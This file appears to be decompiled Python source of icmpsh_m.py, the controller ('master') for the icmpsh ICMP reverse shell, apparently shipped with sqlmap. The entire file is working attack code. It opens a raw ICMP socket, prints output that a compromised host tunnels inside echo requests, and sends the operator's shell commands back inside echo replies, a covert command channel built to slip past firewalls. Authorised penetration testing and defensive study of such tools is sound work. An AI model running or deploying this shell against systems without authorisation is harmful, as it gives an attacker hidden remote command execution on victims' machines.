# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /Users/Dani/Documents/Projects/Golismero_2.0/src_github/tools/sqlmap/extra/icmpsh/icmpsh_m.py
# Compiled at: 2013-12-09 06:41:17
import os, select, socket, subprocess, sys

def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """
    import fcntl
    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)


def main(src, dst):
    if subprocess.mswindows:
        sys.stderr.write('icmpsh master can only run on Posix systems\n')
        sys.exit(255)
    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('You need to install Python Impacket library first\n')
        sys.exit(255)

    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error:
        sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
    decoder = ImpactDecoder.IPDecoder()
    while 1:
        cmd = ''
        if sock in select.select([sock], [], [])[0]:
            buff = sock.recv(4096)
            if 0 == len(buff):
                sock.close()
                sys.exit(0)
            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()
            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()
                if len(data) > 0:
                    sys.stdout.write(data)
                try:
                    cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == 'exit\n':
                    return
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)
                icmp.contains(ImpactPacket.Data(cmd))
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1
                ip.contains(icmp)
                sock.sendto(ip.get_packet(), (dst, 0))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        msg = 'missing mandatory options. Execute as root:\n'
        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
        sys.stderr.write(msg)
        sys.exit(1)
    main(sys.argv[1], sys.argv[2])